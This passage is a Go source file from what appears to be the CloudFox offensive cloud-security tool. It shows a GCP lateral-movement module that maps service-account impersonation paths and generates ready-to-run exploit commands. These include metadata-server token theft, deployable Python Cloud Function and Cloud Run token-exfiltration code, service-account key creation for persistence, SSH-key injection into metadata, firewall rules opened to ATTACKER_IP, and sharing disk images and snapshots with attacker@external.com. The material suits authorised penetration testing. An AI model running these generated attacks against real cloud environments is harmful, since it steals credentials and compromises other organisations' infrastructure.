package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	attackpathservice "github.com/BishopFox/cloudfox/gcp/services/attackpathService"
	CloudRunService "github.com/BishopFox/cloudfox/gcp/services/cloudrunService"
	ComputeEngineService "github.com/BishopFox/cloudfox/gcp/services/computeEngineService"
	FunctionsService "github.com/BishopFox/cloudfox/gcp/services/functionsService"
	GKEService "github.com/BishopFox/cloudfox/gcp/services/gkeService"
	IAMService "github.com/BishopFox/cloudfox/gcp/services/iamService"
	"github.com/BishopFox/cloudfox/gcp/shared"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"
)

// Module name constant
const GCP_LATERALMOVEMENT_MODULE_NAME string = "lateral-movement"

var GCPLateralMovementCommand = &cobra.Command{
	Use:     GCP_LATERALMOVEMENT_MODULE_NAME,
	Aliases: []string{"lateral", "pivot"},
	Short:   "Map lateral movement paths, credential theft vectors, and pivot opportunities",
	Long: `Identify lateral movement opportunities within and across GCP projects.

Features:
- Maps service account impersonation chains (SA → SA → SA)
- Identifies token creator permissions (lateral movement via impersonation)
- Finds cross-project access paths
- Detects VM metadata abuse vectors
- Analyzes credential storage locations (secrets, environment variables)
- Maps attack paths from compromised identities
- Generates exploitation commands for penetration testing

This module helps identify how an attacker could move laterally after gaining
initial access to a GCP environment.`,
	Run: runGCPLateralMovementCommand,
}

// ------------------------------
// Data Structures
// ------------------------------

type ImpersonationChain struct {
	StartIdentity  string
	TargetSA       string
	ChainLength    int
	Path           []string // [identity] -> [sa1] -> [sa2] -> ...
	RiskLevel      string   // CRITICAL, HIGH, MEDIUM
	ExploitCommand string
}

type TokenTheftVector struct {
	ResourceType   string // "instance", "function", "cloudrun", etc.
	ResourceName   string
	ProjectID      string
	ServiceAccount string
	AttackVector   string // "metadata", "env_var", "startup_script", etc.
	RiskLevel      string
	ExploitCommand string
}

// PermissionBasedLateralPath represents a lateral movement capability based on IAM permissions
type PermissionBasedLateralPath struct {
	Principal      string // Who has this capability
	PrincipalType  string // user, serviceAccount, group
	ProjectID      string // Project where permission exists
	Permission     string // The dangerous permission
	Category       string // Category of lateral movement
	RiskLevel      string // CRITICAL, HIGH, MEDIUM
	Description    string // What this enables
	ExploitCommand string // Command to exploit
}

// ------------------------------
// Module Struct
// ------------------------------
type LateralMovementModule struct {
	gcpinternal.BaseGCPModule

	ProjectImpersonationChains  map[string][]ImpersonationChain            // projectID -> chains
	ProjectTokenTheftVectors    map[string][]TokenTheftVector              // projectID -> vectors
	ProjectPermissionBasedPaths map[string][]PermissionBasedLateralPath    // projectID -> permission-based paths
	LootMap                     map[string]map[string]*internal.LootFile   // projectID -> loot files
	mu                          sync.Mutex
}

// ------------------------------
// Output Struct
// ------------------------------
type LateralMovementOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o LateralMovementOutput) TableFiles() []internal.TableFile { return o.Table }
func (o LateralMovementOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Command Entry Point
// ------------------------------
func runGCPLateralMovementCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, GCP_LATERALMOVEMENT_MODULE_NAME)
	if err != nil {
		return
	}

	module := &LateralMovementModule{
		BaseGCPModule:               gcpinternal.NewBaseGCPModule(cmdCtx),
		ProjectImpersonationChains:  make(map[string][]ImpersonationChain),
		ProjectTokenTheftVectors:    make(map[string][]TokenTheftVector),
		ProjectPermissionBasedPaths: make(map[string][]PermissionBasedLateralPath),
		LootMap:                     make(map[string]map[string]*internal.LootFile),
	}

	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Module Execution
// ------------------------------
func (m *LateralMovementModule) getAllImpersonationChains() []ImpersonationChain {
	var all []ImpersonationChain
	for _, chains := range m.ProjectImpersonationChains {
		all = append(all, chains...)
	}
	return all
}

func (m *LateralMovementModule) getAllTokenTheftVectors() []TokenTheftVector {
	var all []TokenTheftVector
	for _, vectors := range m.ProjectTokenTheftVectors {
		all = append(all, vectors...)
	}
	return all
}

func (m *LateralMovementModule) getAllPermissionBasedPaths() []PermissionBasedLateralPath {
	var all []PermissionBasedLateralPath
	for _, paths := range m.ProjectPermissionBasedPaths {
		all = append(all, paths...)
	}
	return all
}

func (m *LateralMovementModule) Execute(ctx context.Context, logger internal.Logger) {
	logger.InfoM("Mapping lateral movement paths...", GCP_LATERALMOVEMENT_MODULE_NAME)

	// Analyze org and folder level lateral movement paths (runs once for all projects)
	m.analyzeOrgFolderLateralPaths(ctx, logger)

	// Process each project
	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, GCP_LATERALMOVEMENT_MODULE_NAME, m.processProject)

	allChains := m.getAllImpersonationChains()
	allVectors := m.getAllTokenTheftVectors()
	allPermBasedPaths := m.getAllPermissionBasedPaths()

	// Check results
	totalPaths := len(allChains) + len(allVectors) + len(allPermBasedPaths)
	if totalPaths == 0 {
		logger.InfoM("No lateral movement paths found", GCP_LATERALMOVEMENT_MODULE_NAME)
		return
	}

	logger.SuccessM(fmt.Sprintf("Found %d lateral movement path(s): %d impersonation chains, %d token theft vectors, %d permission-based",
		totalPaths, len(allChains), len(allVectors), len(allPermBasedPaths)), GCP_LATERALMOVEMENT_MODULE_NAME)

	m.writeOutput(ctx, logger)
}

// analyzeOrgFolderLateralPaths analyzes organization and folder level IAM for lateral movement permissions
func (m *LateralMovementModule) analyzeOrgFolderLateralPaths(ctx context.Context, logger internal.Logger) {
	attackSvc := attackpathservice.New()

	// Analyze organization-level IAM
	orgPaths, orgNames, _, err := attackSvc.AnalyzeOrganizationAttackPaths(ctx, "lateral")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME, "Could not analyze organization-level lateral movement paths")
		}
	} else if len(orgPaths) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d organization-level lateral movement path(s)", len(orgPaths)), GCP_LATERALMOVEMENT_MODULE_NAME)
		for _, path := range orgPaths {
			orgName := orgNames[path.ScopeID]
			if orgName == "" {
				orgName = path.ScopeID
			}
			lateralPath := PermissionBasedLateralPath{
				Principal:      path.Principal,
				PrincipalType:  path.PrincipalType,
				ProjectID:      "org:" + path.ScopeID,
				Permission:     path.Method,
				Category:       path.Category + " (Org: " + orgName + ")",
				RiskLevel:      "CRITICAL", // Org-level is critical
				Description:    path.Description,
				ExploitCommand: path.ExploitCommand,
			}
			// Store under a special "organization" key
			m.mu.Lock()
			m.ProjectPermissionBasedPaths["organization"] = append(m.ProjectPermissionBasedPaths["organization"], lateralPath)
			m.mu.Unlock()
		}
	}

	// Analyze folder-level IAM
	folderPaths, folderNames, err := attackSvc.AnalyzeFolderAttackPaths(ctx, "lateral")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME, "Could not analyze folder-level lateral movement paths")
		}
	} else if len(folderPaths) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d folder-level lateral movement path(s)", len(folderPaths)), GCP_LATERALMOVEMENT_MODULE_NAME)
		for _, path := range folderPaths {
			folderName := folderNames[path.ScopeID]
			if folderName == "" {
				folderName = path.ScopeID
			}
			lateralPath := PermissionBasedLateralPath{
				Principal:      path.Principal,
				PrincipalType:  path.PrincipalType,
				ProjectID:      "folder:" + path.ScopeID,
				Permission:     path.Method,
				Category:       path.Category + " (Folder: " + folderName + ")",
				RiskLevel:      "CRITICAL", // Folder-level is critical
				Description:    path.Description,
				ExploitCommand: path.ExploitCommand,
			}
			// Store under a special "folder" key
			m.mu.Lock()
			m.ProjectPermissionBasedPaths["folder"] = append(m.ProjectPermissionBasedPaths["folder"], lateralPath)
			m.mu.Unlock()
		}
	}
}

// ------------------------------
// Project Processor
// ------------------------------
func (m *LateralMovementModule) initializeLootForProject(projectID string) {
	if m.LootMap[projectID] == nil {
		m.LootMap[projectID] = make(map[string]*internal.LootFile)
		m.LootMap[projectID]["impersonation-chains-commands"] = &internal.LootFile{
			Name:     "impersonation-chains-commands",
			Contents: "# Impersonation Chain Exploit Commands\n# Generated by CloudFox\n\n",
		}
		m.LootMap[projectID]["token-theft-commands"] = &internal.LootFile{
			Name:     "token-theft-commands",
			Contents: "# Token Theft Exploit Commands\n# Generated by CloudFox\n\n",
		}
	}
}

func (m *LateralMovementModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Analyzing lateral movement paths in project: %s", projectID), GCP_LATERALMOVEMENT_MODULE_NAME)
	}

	m.mu.Lock()
	m.initializeLootForProject(projectID)
	m.mu.Unlock()

	// 1. Find impersonation chains
	m.findImpersonationChains(ctx, projectID, logger)

	// 2. Find token theft vectors (compute instances, functions, etc.)
	m.findTokenTheftVectors(ctx, projectID, logger)

	// 3. Find permission-based lateral movement paths
	m.findPermissionBasedLateralPaths(ctx, projectID, logger)
}

// findImpersonationChains finds service account impersonation paths
func (m *LateralMovementModule) findImpersonationChains(ctx context.Context, projectID string, logger internal.Logger) {
	iamService := IAMService.New()

	// Get all service accounts
	serviceAccounts, err := iamService.ServiceAccounts(projectID)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
			fmt.Sprintf("Could not get service accounts in project %s", projectID))
		return
	}

	// For each SA, check who can impersonate it using GetServiceAccountIAMPolicy
	for _, sa := range serviceAccounts {
		impersonationInfo, err := iamService.GetServiceAccountIAMPolicy(ctx, sa.Email, projectID)
		if err != nil {
			continue
		}

		// Token creators can impersonate
		for _, creator := range impersonationInfo.TokenCreators {
			// Skip allUsers/allAuthenticatedUsers - those are handled separately
			if shared.IsPublicPrincipal(creator) {
				continue
			}

			chain := ImpersonationChain{
				StartIdentity:  creator,
				TargetSA:       sa.Email,
				ChainLength:    1,
				Path:           []string{creator, sa.Email},
				RiskLevel:      "HIGH",
				ExploitCommand: fmt.Sprintf("gcloud auth print-access-token --impersonate-service-account=%s", sa.Email),
			}

			// If target SA has roles/owner or roles/editor, it's critical
			if impersonationInfo.RiskLevel == "CRITICAL" {
				chain.RiskLevel = "CRITICAL"
			}

			m.mu.Lock()
			m.ProjectImpersonationChains[projectID] = append(m.ProjectImpersonationChains[projectID], chain)
			m.addImpersonationChainToLoot(chain, projectID)
			m.mu.Unlock()
		}

		// Key creators can create persistent access
		for _, creator := range impersonationInfo.KeyCreators {
			if shared.IsPublicPrincipal(creator) {
				continue
			}

			chain := ImpersonationChain{
				StartIdentity:  creator,
				TargetSA:       sa.Email,
				ChainLength:    1,
				Path:           []string{creator, sa.Email},
				RiskLevel:      "CRITICAL",
				ExploitCommand: fmt.Sprintf("gcloud iam service-accounts keys create key.json --iam-account=%s", sa.Email),
			}

			m.mu.Lock()
			m.ProjectImpersonationChains[projectID] = append(m.ProjectImpersonationChains[projectID], chain)
			m.addImpersonationChainToLoot(chain, projectID)
			m.mu.Unlock()
		}
	}
}

// findTokenTheftVectors finds compute resources where tokens can be stolen
func (m *LateralMovementModule) findTokenTheftVectors(ctx context.Context, projectID string, logger internal.Logger) {
	// Find Compute Engine instances with service accounts
	m.findComputeInstanceVectors(ctx, projectID, logger)

	// Find Cloud Functions with service accounts
	m.findCloudFunctionVectors(ctx, projectID, logger)

	// Find Cloud Run services with service accounts
	m.findCloudRunVectors(ctx, projectID, logger)

	// Find GKE clusters with node service accounts
	m.findGKEVectors(ctx, projectID, logger)
}

// findComputeInstanceVectors finds compute instances where tokens can be stolen via metadata server
func (m *LateralMovementModule) findComputeInstanceVectors(ctx context.Context, projectID string, logger internal.Logger) {
	computeService := ComputeEngineService.New()

	instances, err := computeService.Instances(projectID)
	if err != nil {
		// Don't count as error - API may not be enabled
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not get compute instances in project %s", projectID))
		}
		return
	}

	for _, instance := range instances {
		// Skip instances without service accounts
		if len(instance.ServiceAccounts) == 0 {
			continue
		}

		for _, sa := range instance.ServiceAccounts {
			// Skip default compute SA if it has no useful scopes
			if sa.Email == "" {
				continue
			}

			vector := TokenTheftVector{
				ResourceType:   "compute_instance",
				ResourceName:   instance.Name,
				ProjectID:      projectID,
				ServiceAccount: sa.Email,
				AttackVector:   "metadata_server",
				RiskLevel:      "HIGH",
				ExploitCommand: fmt.Sprintf(`# SSH into instance and steal token
gcloud compute ssh %s --zone=%s --project=%s --command='curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"'`,
					instance.Name, instance.Zone, projectID),
			}

			m.mu.Lock()
			m.ProjectTokenTheftVectors[projectID] = append(m.ProjectTokenTheftVectors[projectID], vector)
			m.addTokenTheftVectorToLoot(projectID, vector)
			m.mu.Unlock()
		}
	}
}

// findCloudFunctionVectors finds Cloud Functions where tokens can be stolen
func (m *LateralMovementModule) findCloudFunctionVectors(ctx context.Context, projectID string, logger internal.Logger) {
	functionsService := FunctionsService.New()

	functions, err := functionsService.Functions(projectID)
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not get Cloud Functions in project %s", projectID))
		}
		return
	}

	for _, fn := range functions {
		if fn.ServiceAccount == "" {
			continue
		}

		// Generate exploit with PoC code, deploy command, and invoke command
		exploitCmd := fmt.Sprintf(`# Target: Cloud Function %s
# Service Account: %s
# Region: %s

# Step 1: Create token exfiltration function code
mkdir -p /tmp/token-theft-%s && cd /tmp/token-theft-%s

cat > main.py << 'PYEOF'
import functions_framework
import requests

@functions_framework.http
def steal_token(request):
    # Fetch SA token from metadata server
    token_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    headers = {"Metadata-Flavor": "Google"}
    resp = requests.get(token_url, headers=headers)
    token_data = resp.json()

    # Fetch SA email
    email_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
    email_resp = requests.get(email_url, headers=headers)

    return {
        "service_account": email_resp.text,
        "access_token": token_data.get("access_token"),
        "token_type": token_data.get("token_type"),
        "expires_in": token_data.get("expires_in")
    }
PYEOF

cat > requirements.txt << 'REQEOF'
functions-framework==3.*
requests==2.*
REQEOF

# Step 2: Deploy function with target SA (requires cloudfunctions.functions.create + iam.serviceAccounts.actAs)
gcloud functions deploy token-theft-poc \
    --gen2 \
    --runtime=python311 \
    --region=%s \
    --source=. \
    --entry-point=steal_token \
    --trigger-http \
    --allow-unauthenticated \
    --service-account=%s \
    --project=%s

# Step 3: Invoke function to get token
curl -s $(gcloud functions describe token-theft-poc --region=%s --project=%s --format='value(url)')

# Cleanup
gcloud functions delete token-theft-poc --region=%s --project=%s --quiet`,
			fn.Name, fn.ServiceAccount, fn.Region,
			fn.Name, fn.Name,
			fn.Region, fn.ServiceAccount, projectID,
			fn.Region, projectID,
			fn.Region, projectID)

		vector := TokenTheftVector{
			ResourceType:   "cloud_function",
			ResourceName:   fn.Name,
			ProjectID:      projectID,
			ServiceAccount: fn.ServiceAccount,
			AttackVector:   "function_execution",
			RiskLevel:      "HIGH",
			ExploitCommand: exploitCmd,
		}

		m.mu.Lock()
		m.ProjectTokenTheftVectors[projectID] = append(m.ProjectTokenTheftVectors[projectID], vector)
		m.addTokenTheftVectorToLoot(projectID, vector)
		m.mu.Unlock()
	}
}

// findCloudRunVectors finds Cloud Run services where tokens can be stolen
func (m *LateralMovementModule) findCloudRunVectors(ctx context.Context, projectID string, logger internal.Logger) {
	cloudRunService := CloudRunService.New()

	services, err := cloudRunService.Services(projectID)
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not get Cloud Run services in project %s", projectID))
		}
		return
	}

	for _, svc := range services {
		if svc.ServiceAccount == "" {
			continue
		}

		// Generate exploit with PoC code, deploy command, and invoke command
		exploitCmd := fmt.Sprintf(`# Target: Cloud Run Service %s
# Service Account: %s
# Region: %s

# Step 1: Create token exfiltration container
mkdir -p /tmp/cloudrun-theft-%s && cd /tmp/cloudrun-theft-%s

cat > main.py << 'PYEOF'
from flask import Flask, jsonify
import requests
import os

app = Flask(__name__)

@app.route("/")
def steal_token():
    # Fetch SA token from metadata server
    token_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    headers = {"Metadata-Flavor": "Google"}
    resp = requests.get(token_url, headers=headers)
    token_data = resp.json()

    # Fetch SA email
    email_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
    email_resp = requests.get(email_url, headers=headers)

    return jsonify({
        "service_account": email_resp.text,
        "access_token": token_data.get("access_token"),
        "token_type": token_data.get("token_type"),
        "expires_in": token_data.get("expires_in")
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
PYEOF

cat > requirements.txt << 'REQEOF'
flask==3.*
requests==2.*
gunicorn==21.*
REQEOF

cat > Dockerfile << 'DOCKEOF'
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY main.py .
CMD exec gunicorn --bind :$PORT --workers 1 --threads 8 --timeout 0 main:app
DOCKEOF

# Step 2: Build and push container
gcloud builds submit --tag gcr.io/%s/token-theft-poc --project=%s

# Step 3: Deploy Cloud Run service with target SA (requires run.services.create + iam.serviceAccounts.actAs)
gcloud run deploy token-theft-poc \
    --image gcr.io/%s/token-theft-poc \
    --region=%s \
    --service-account=%s \
    --allow-unauthenticated \
    --project=%s

# Step 4: Invoke service to get token
curl -s $(gcloud run services describe token-theft-poc --region=%s --project=%s --format='value(status.url)')

# Cleanup
gcloud run services delete token-theft-poc --region=%s --project=%s --quiet
gcloud container images delete gcr.io/%s/token-theft-poc --quiet --force-delete-tags`,
			svc.Name, svc.ServiceAccount, svc.Region,
			svc.Name, svc.Name,
			projectID, projectID,
			projectID, svc.Region, svc.ServiceAccount, projectID,
			svc.Region, projectID,
			svc.Region, projectID,
			projectID)

		vector := TokenTheftVector{
			ResourceType:   "cloud_run",
			ResourceName:   svc.Name,
			ProjectID:      projectID,
			ServiceAccount: svc.ServiceAccount,
			AttackVector:   "container_execution",
			RiskLevel:      "HIGH",
			ExploitCommand: exploitCmd,
		}

		m.mu.Lock()
		m.ProjectTokenTheftVectors[projectID] = append(m.ProjectTokenTheftVectors[projectID], vector)
		m.addTokenTheftVectorToLoot(projectID, vector)
		m.mu.Unlock()
	}
}

// findGKEVectors finds GKE clusters/node pools where tokens can be stolen
func (m *LateralMovementModule) findGKEVectors(ctx context.Context, projectID string, logger internal.Logger) {
	gkeService := GKEService.New()

	clusters, nodePools, err := gkeService.Clusters(projectID)
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not get GKE clusters in project %s", projectID))
		}
		return
	}

	// Track cluster SAs to avoid duplicates in node pools
	clusterSAs := make(map[string]string) // clusterName -> SA

	for _, cluster := range clusters {
		// Check node service account
		if cluster.NodeServiceAccount != "" {
			clusterSAs[cluster.Name] = cluster.NodeServiceAccount

			var exploitCmd string
			if cluster.WorkloadIdentity != "" {
				exploitCmd = fmt.Sprintf(`# Cluster uses Workload Identity - tokens are pod-specific
# Get credentials for cluster:
gcloud container clusters get-credentials %s --location=%s --project=%s
# Then exec into a pod and check for mounted SA token:
kubectl exec -it <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token`,
					cluster.Name, cluster.Location, projectID)
			} else {
				exploitCmd = fmt.Sprintf(`# Cluster uses node SA (no Workload Identity) - all pods can access node SA
gcloud container clusters get-credentials %s --location=%s --project=%s
# Exec into any pod and steal node SA token:
kubectl exec -it <pod> -- curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"`,
					cluster.Name, cluster.Location, projectID)
			}

			vector := TokenTheftVector{
				ResourceType:   "gke_cluster",
				ResourceName:   cluster.Name,
				ProjectID:      projectID,
				ServiceAccount: cluster.NodeServiceAccount,
				AttackVector:   "pod_service_account",
				RiskLevel:      "HIGH",
				ExploitCommand: exploitCmd,
			}

			m.mu.Lock()
			m.ProjectTokenTheftVectors[projectID] = append(m.ProjectTokenTheftVectors[projectID], vector)
			m.addTokenTheftVectorToLoot(projectID, vector)
			m.mu.Unlock()
		}
	}

	// Process node pools with different SAs than their cluster
	for _, np := range nodePools {
		clusterSA := clusterSAs[np.ClusterName]
		if np.ServiceAccount == "" || np.ServiceAccount == clusterSA {
			continue // Skip if same as cluster SA or empty
		}

		exploitCmd := fmt.Sprintf(`# Node pool %s uses specific SA
gcloud container clusters get-credentials %s --location=%s --project=%s
# Exec into pod running on this node pool and steal token`,
			np.Name, np.ClusterName, np.Location, projectID)

		vector := TokenTheftVector{
			ResourceType:   "gke_nodepool",
			ResourceName:   fmt.Sprintf("%s/%s", np.ClusterName, np.Name),
			ProjectID:      projectID,
			ServiceAccount: np.ServiceAccount,
			AttackVector:   "pod_service_account",
			RiskLevel:      "HIGH",
			ExploitCommand: exploitCmd,
		}

		m.mu.Lock()
		m.ProjectTokenTheftVectors[projectID] = append(m.ProjectTokenTheftVectors[projectID], vector)
		m.addTokenTheftVectorToLoot(projectID, vector)
		m.mu.Unlock()
	}
}

// findPermissionBasedLateralPaths identifies principals with lateral movement permissions
// This now uses the centralized attackpathService for project and resource-level analysis
func (m *LateralMovementModule) findPermissionBasedLateralPaths(ctx context.Context, projectID string, logger internal.Logger) {
	// Use attackpathService for project-level analysis
	attackSvc := attackpathservice.New()

	projectName := m.GetProjectName(projectID)
	paths, err := attackSvc.AnalyzeProjectAttackPaths(ctx, projectID, projectName, "lateral")
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
			fmt.Sprintf("Could not analyze lateral movement permissions for project %s", projectID))
		return
	}

	// Convert AttackPath to PermissionBasedLateralPath
	for _, path := range paths {
		lateralPath := PermissionBasedLateralPath{
			Principal:      path.Principal,
			PrincipalType:  path.PrincipalType,
			ProjectID:      projectID,
			Permission:     path.Method,
			Category:       path.Category,
			RiskLevel:      "HIGH", // Default risk level
			Description:    path.Description,
			ExploitCommand: path.ExploitCommand,
		}

		m.mu.Lock()
		m.ProjectPermissionBasedPaths[projectID] = append(m.ProjectPermissionBasedPaths[projectID], lateralPath)
		m.mu.Unlock()
	}

	// Also analyze resource-level IAM
	resourcePaths, err := attackSvc.AnalyzeResourceAttackPaths(ctx, projectID, "lateral")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not analyze resource-level lateral movement permissions for project %s", projectID))
		}
	} else {
		for _, path := range resourcePaths {
			lateralPath := PermissionBasedLateralPath{
				Principal:      path.Principal,
				PrincipalType:  path.PrincipalType,
				ProjectID:      projectID,
				Permission:     path.Method,
				Category:       path.Category + " (Resource: " + path.ScopeName + ")",
				RiskLevel:      "HIGH",
				Description:    path.Description,
				ExploitCommand: path.ExploitCommand,
			}

			m.mu.Lock()
			m.ProjectPermissionBasedPaths[projectID] = append(m.ProjectPermissionBasedPaths[projectID], lateralPath)
			m.mu.Unlock()
		}
	}
}

// generateLateralExploitCommand generates an exploit command for a lateral movement permission
func (m *LateralMovementModule) generateLateralExploitCommand(permission, projectID string) string {
	switch permission {
	case "compute.networks.addPeering":
		return fmt.Sprintf(`# Create VPC peering to another project's network
gcloud compute networks peerings create lateral-peering \
    --network=NETWORK_NAME \
    --peer-network=projects/TARGET_PROJECT/global/networks/TARGET_NETWORK \
    --project=%s`, projectID)
	case "compute.instances.osLogin":
		return fmt.Sprintf(`# SSH into instance via OS Login
gcloud compute ssh INSTANCE_NAME --zone=ZONE --project=%s`, projectID)
	case "compute.instances.osAdminLogin":
		return fmt.Sprintf(`# SSH into instance with sudo via OS Login
gcloud compute ssh INSTANCE_NAME --zone=ZONE --project=%s
# Then: sudo su`, projectID)
	case "compute.instances.setMetadata":
		return fmt.Sprintf(`# Add SSH key to instance metadata
gcloud compute instances add-metadata INSTANCE_NAME --zone=ZONE \
    --metadata=ssh-keys="username:$(cat ~/.ssh/id_rsa.pub)" --project=%s`, projectID)
	case "compute.projects.setCommonInstanceMetadata":
		return fmt.Sprintf(`# Add SSH key to project-wide metadata (affects all instances)
gcloud compute project-info add-metadata \
    --metadata=ssh-keys="username:$(cat ~/.ssh/id_rsa.pub)" --project=%s`, projectID)
	case "container.clusters.getCredentials":
		return fmt.Sprintf(`# Get GKE cluster credentials
gcloud container clusters get-credentials CLUSTER_NAME --zone=ZONE --project=%s`, projectID)
	case "container.pods.exec":
		return fmt.Sprintf(`# Execute commands in a pod
kubectl exec -it POD_NAME -- /bin/sh`, projectID)
	case "compute.firewalls.create":
		return fmt.Sprintf(`# Create firewall rule to allow access
gcloud compute firewall-rules create allow-lateral \
    --network=NETWORK_NAME --allow=tcp:22,tcp:3389 \
    --source-ranges=ATTACKER_IP/32 --project=%s`, projectID)
	case "cloudsql.instances.connect":
		return fmt.Sprintf(`# Connect to Cloud SQL instance
gcloud sql connect INSTANCE_NAME --user=USER --project=%s`, projectID)
	case "iap.tunnelInstances.accessViaIAP":
		return fmt.Sprintf(`# Access instance via IAP tunnel
gcloud compute start-iap-tunnel INSTANCE_NAME PORT --zone=ZONE --project=%s`, projectID)
	case "compute.images.setIamPolicy":
		return fmt.Sprintf(`# Share VM image with external project
gcloud compute images add-iam-policy-binding IMAGE_NAME \
    --member='user:attacker@external.com' --role='roles/compute.imageUser' --project=%s`, projectID)
	case "compute.snapshots.setIamPolicy":
		return fmt.Sprintf(`# Share snapshot with external project
gcloud compute snapshots add-iam-policy-binding SNAPSHOT_NAME \
    --member='user:attacker@external.com' --role='roles/compute.storageAdmin' --project=%s`, projectID)
	default:
		return fmt.Sprintf("# Permission: %s\n# Refer to GCP documentation for exploitation", permission)
	}
}

// ------------------------------
// Loot File Management
// ------------------------------
func (m *LateralMovementModule) addImpersonationChainToLoot(chain ImpersonationChain, projectID string) {
	lootFile := m.LootMap[projectID]["impersonation-chains-commands"]
	if lootFile == nil {
		return
	}
	lootFile.Contents += fmt.Sprintf(
		"# Impersonation: %s -> %s\n"+
			"# Path: %s\n"+
			"%s\n\n",
		chain.StartIdentity,
		chain.TargetSA,
		strings.Join(chain.Path, " -> "),
		chain.ExploitCommand,
	)
}

func (m *LateralMovementModule) addTokenTheftVectorToLoot(projectID string, vector TokenTheftVector) {
	lootFile := m.LootMap[projectID]["token-theft-commands"]
	if lootFile == nil {
		return
	}
	lootFile.Contents += fmt.Sprintf(
		"# Token Theft: %s (%s)\n"+
			"# Project: %s\n"+
			"# Service Account: %s\n"+
			"# Attack Vector: %s\n"+
			"%s\n\n",
		vector.ResourceType,
		vector.ResourceName,
		vector.ProjectID,
		vector.ServiceAccount,
		vector.AttackVector,
		vector.ExploitCommand,
	)
}

// ------------------------------
// Output Generation
// ------------------------------
func (m *LateralMovementModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

func (m *LateralMovementModule) getChainsHeader() []string {
	return []string{
		"Source Identity",
		"Action",
		"Target Service Account",
		"Impersonation Path",
	}
}

func (m *LateralMovementModule) getVectorsHeader() []string {
	return []string{
		"Project Name",
		"Project ID",
		"Source Resource Type",
		"Source Resource Name",
		"Action",
		"Target Service Account",
	}
}

func (m *LateralMovementModule) chainsToTableBody(chains []ImpersonationChain) [][]string {
	var body [][]string
	for _, chain := range chains {
		action := "Impersonate (Get Token)"
		if strings.Contains(chain.ExploitCommand, "keys create") {
			action = "Create Key"
		}

		body = append(body, []string{
			chain.StartIdentity,
			action,
			chain.TargetSA,
			strings.Join(chain.Path, " -> "),
		})
	}
	return body
}

func (m *LateralMovementModule) vectorsToTableBody(vectors []TokenTheftVector) [][]string {
	var body [][]string
	for _, vector := range vectors {
		action := vector.AttackVector
		switch vector.AttackVector {
		case "metadata_server":
			action = "Steal Token (Metadata)"
		case "function_execution":
			action = "Steal Token (Function)"
		case "container_execution":
			action = "Steal Token (Container)"
		case "pod_service_account":
			action = "Steal Token (Pod)"
		}

		body = append(body, []string{
			m.GetProjectName(vector.ProjectID),
			vector.ProjectID,
			vector.ResourceType,
			vector.ResourceName,
			action,
			vector.ServiceAccount,
		})
	}
	return body
}

func (m *LateralMovementModule) buildTablesForProject(projectID string) []internal.TableFile {
	var tableFiles []internal.TableFile

	if chains, ok := m.ProjectImpersonationChains[projectID]; ok && len(chains) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   "lateral-impersonation-chains",
			Header: m.getChainsHeader(),
			Body:   m.chainsToTableBody(chains),
		})
	}

	if vectors, ok := m.ProjectTokenTheftVectors[projectID]; ok && len(vectors) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   "lateral-token-theft",
